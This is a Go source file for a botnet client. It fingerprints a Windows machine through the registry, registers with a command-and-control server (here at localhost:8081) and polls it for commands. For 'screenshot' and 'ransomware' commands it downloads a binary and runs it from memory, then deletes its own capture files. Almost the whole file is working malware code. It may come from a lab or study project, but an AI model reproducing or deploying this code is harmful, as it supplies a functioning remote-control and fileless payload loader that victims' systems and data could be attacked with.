package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/amenzhinsky/go-memexec"
	"golang.org/x/sys/windows/registry"
	"os"
	"path/filepath"
	"runtime"

	//"io"
	"io/ioutil"
	"log"
	"net/http"
	//"os"
	//"os/exec"
	"strings"
	"time"
	//"unicode"
)

type bot struct {
	Id       string `json:"bot_id"`
	Status   string `json:"status"`
	Lastseen string `json:"lastseen"`
	Command  string `json:"command"`
}

var opersys = runtime.GOOS

func getTime() string {
	currentTime := time.Now()
	return currentTime.Format(time.RFC850)
}

func getmachineid() string {
	var id string
	if opersys == "windows" {
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\SQMClient`, registry.QUERY_VALUE)
		if err != nil {
			log.Fatal(err)
		}
		defer k.Close()

		s, _, err := k.GetStringValue("MachineId")
		s2 := strings.Trim(s, "{}")
		res1 := strings.Split(s2, "-")
		id = res1[len(res1)-1]
		if err != nil {
			log.Fatal(err)
		}
	}
	return id
}

var idnum = getmachineid()

func register() {

	b := bot{
		Id:       idnum,
		Status:   "alive",
		Lastseen: getTime(),
		Command:  "",
	}

	postBody, _ := json.Marshal(b)

	resp, err := http.Post("http://localhost:8081/register", "application/json", bytes.NewBuffer(postBody))
	//Handle Error
	if err != nil {
		fmt.Printf("An Error Occured %v\n", err)
		panic(err)
	}

	defer resp.Body.Close()
}

var failflag = 0

func heartbeat() {

	b := bot{
		Id:       idnum,
		Status:   "alive",
		Lastseen: getTime(),
		Command:  "",
	}

	postBody, _ := json.Marshal(b)

	resp, err := http.Post("http://localhost:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
	//Handle Error
	if err != nil {
		fmt.Printf("An Error Occured %v\n", err)
		failflag = 1
		return
	} else {
		if failflag == 1 {
			fmt.Printf("connection reestablished\n")
			failflag = 0
		}
	}
	cmdrsp := resp.Header.Get("Command")
	if cmdrsp != "" {
		execmod(cmdrsp)
	}

	defer resp.Body.Close()
}

func execmod(cmdrsp string) {
	fmt.Printf("received %s module\n", cmdrsp)

	if cmdrsp == "screenshot" {
		resp, err := http.Get("http://localhost:8081/screen")
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
		}
		defer resp.Body.Close()
		// Check server response
		if resp.StatusCode != http.StatusOK {
			log.Fatalf("bad status: %s", resp.Status)
		}

		mybinary, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
		}

		exe, err := memexec.New(mybinary)
		if err != nil {
			panic(err)
		}
		defer exe.Close()

		cmd := exe.Command()
		cmd.Output()

		err = filepath.Walk("./", deletefiles)
		if err != nil {
			panic(err)
		}
	} else if strings.Contains(cmdrsp, "ransomware") {

		strs := strings.Split(cmdrsp, " ")

		option := strs[len(strs)-1]

		resp, err := http.Get("http://localhost:8081/ransomware")
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
		}
		defer resp.Body.Close()
		// Check server response
		if resp.StatusCode != http.StatusOK {
			log.Fatalf("bad status: %s", resp.Status)
		}

		mybinary, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("An Error Occured %v", err)
		}

		exe, err := memexec.New(mybinary)
		if err != nil {
			panic(err)
		}
		defer exe.Close()

		cmd := exe.Command(option)
		cmd.Output()
	} else {
		fmt.Println("bad module command")
		return
	}
}

func deletefiles(path string, f os.FileInfo, err error) (e error) {

	// check each file if starts with the idnum
	prefix := idnum + "_"
	if strings.HasPrefix(f.Name(), prefix) {
		os.Remove(path)
	}
	return

}

func main() {

	register()

	for true {
		time.Sleep(3 * time.Second)
		heartbeat()
	}
}
